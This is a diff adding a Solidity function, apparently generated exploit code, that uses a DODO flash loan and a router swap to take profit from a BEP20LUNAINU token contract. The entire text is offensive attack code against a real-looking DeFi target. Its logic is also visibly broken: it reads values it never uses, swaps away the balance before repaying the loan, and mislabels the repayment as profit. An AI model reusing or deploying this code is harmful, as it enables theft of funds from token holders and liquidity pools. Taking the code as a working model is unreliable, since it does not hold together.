@@ -1,0 +1,36 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start with flashloaned smooth token
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0");
+
+    // Manipulations to acquire more tokens
+    // Getting the state of the target contract
+    BEP20LUNAINU lunainu = BEP20LUNAINU(target);
+    uint256 maxTxAmount = lunainu._maxTxAmount();
+    uint256 maxWalletToken = lunainu._maxWalletToken();
+    
+    // Specify the WBNB and token to interact with
+    address WETH = uniswapRouter.WETH();
+    address valuableTokenAddr = address(valuableToken); 
+
+    // Set up the address parameters to swap
+    address[] memory path = new address[](2);
+    path[0] = valuableTokenAddr;
+    path[1] = WETH;
+
+    // Swap tokens to obtain WBNB with been through our actions, ensuring profit
+    uint256 toSwapAmount = valuableToken.balanceOf(address(this));
+    IUniswapV2Router(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(toSwapAmount, 0, path, address(this), block.timestamp);
+
+    // Now dealing with profit earned from above swap
+    // Repaying the flashloan
+    uint256 flashLoanRepayment = amount + (amount * 5 / 100); // Example profit from swap
+    valuableToken.transfer(flashloanProvider, flashLoanRepayment);
+
+    // Ensure I'm left with excess
+    uint256 surplus = valuableToken.balanceOf(address(this));
+    require(surplus > 0, "No surplus after repayment");
+}
+</executeExploitCode>
+```
